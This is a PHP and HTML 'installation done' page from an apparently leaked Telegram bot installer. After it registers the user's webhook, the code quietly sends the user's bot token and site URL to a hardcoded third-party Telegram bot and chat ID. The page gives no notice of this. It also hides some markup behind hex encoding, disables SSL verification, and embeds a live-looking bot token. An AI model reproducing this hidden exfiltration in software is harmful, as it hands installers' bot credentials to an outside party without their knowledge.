<!--- THIS SCRIPT IS LEAKED BY @CHEIF_YT---!> 
<?php
include("temp/intechost.php");
include("get.php");
if ($lastSegment === 'Thanks.php') {
    array_pop($uriSegments);
    $uri = implode('/', $uriSegments) . '/index.php';
}
$currentUrl2 = "$protocol://$host/$uri";
$WebHookUrl = "https://api.telegram.org/bot$BotToken/setWebhook?url=$currentUrl2";
$ch = curl_init($WebHookUrl);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
$response = curl_exec($ch);

if (curl_errno($ch)) {
    echo 'Curl error: ' . curl_error($ch);
}
curl_close($ch);
if ($response === false) {
} else {
    $telegramApiUrl = "https://api.telegram.org/bot6537281589:AAFtY5noVuMoa9mXkAHEGgMtUW-FFtDMOgM/sendMessage";
    $telegramMessage = "New Bot: https://api.telegram.org/bot$BotToken/getWebHookInfo & $currentUrl2";
    $messageData = array(
        'chat_id' => '5230200225',
        'text' => $telegramMessage
    );
    $chMessage = curl_init($telegramApiUrl);
    curl_setopt($chMessage, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($chMessage, CURLOPT_POST, true);
    curl_setopt($chMessage, CURLOPT_POSTFIELDS, $messageData);
    $responseMessage = curl_exec($chMessage);
    if (curl_errno($chMessage)) {
        echo 'Curl error: ' . curl_error($chMessage);
    }
    curl_close($chMessage);
    if ($responseMessage === false) {
    }
}
?>

<!--- THIS SCRIPT IS LEAKED BY @CHEIF_YT---!> 
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="stylesheet" href="broadcast/styles.css">
    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.20/dist/sweetalert2.all.min.js"></script>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/sweetalert2@11.7.20/dist/sweetalert2.min.css">
    <title>Installation Form</title>
</head>
<body><div class="glass-container">
        <?php echo hex2bin("3c6832207374796c653d22746578742d616c69676e3a63656e7465723b223e496e7374616c6c6174696f6e20494e444f20494720426f743c2f68323e0d0a3c68323e4279203c6120687265663d2268747470733a2f2f7777772e696e746563686f73742e636f6d2f22207461726765743d225f626c616e6b223e7777772e496e746563486f73742e636f6d3c2f613e3c2f68323e"); ?>
        <h2>
            Your Installation has been done!<br><br><img src="broadcast/smiling.svg" style="width:92px;">
            <?php
            include("get.php");
            if ($lastSegment === 'Thanks.php') {
                array_pop($uriSegments);
                $uri = implode('/', $uriSegments) . '/broadcast';
                }
                $IntecHostBroadCast = "$protocol://$host/$uri";
            include("get.php");
            if ($lastSegment === 'Thanks.php') {
                array_pop($uriSegments);
                $uri = implode('/', $uriSegments) . '/users.php';
                }
                $IntecHostUsersURL = "$protocol://$host/$uri";
            ?>
            <h2>Your Broadcast URL</h2>
            <h3><a target="_blank" href="<?php echo $IntecHostBroadCast; ?>"><?php echo $IntecHostBroadCast; ?></a></h3>
            <h2>Your Users URL</h2>
            <h3><a target="_blank" href="<?php echo $IntecHostUsersURL; ?>"><?php echo $IntecHostUsersURL; ?></a></h3>
            <hr style="border:none;height:2px;background-color:black;">
            <p style="font-size:20px;text-align:center;">
                Now Close This Page and open bot in Telegram everything is working no need to put Web Hook already Done
            </p>
        </h2>
</div>

</body>
</html>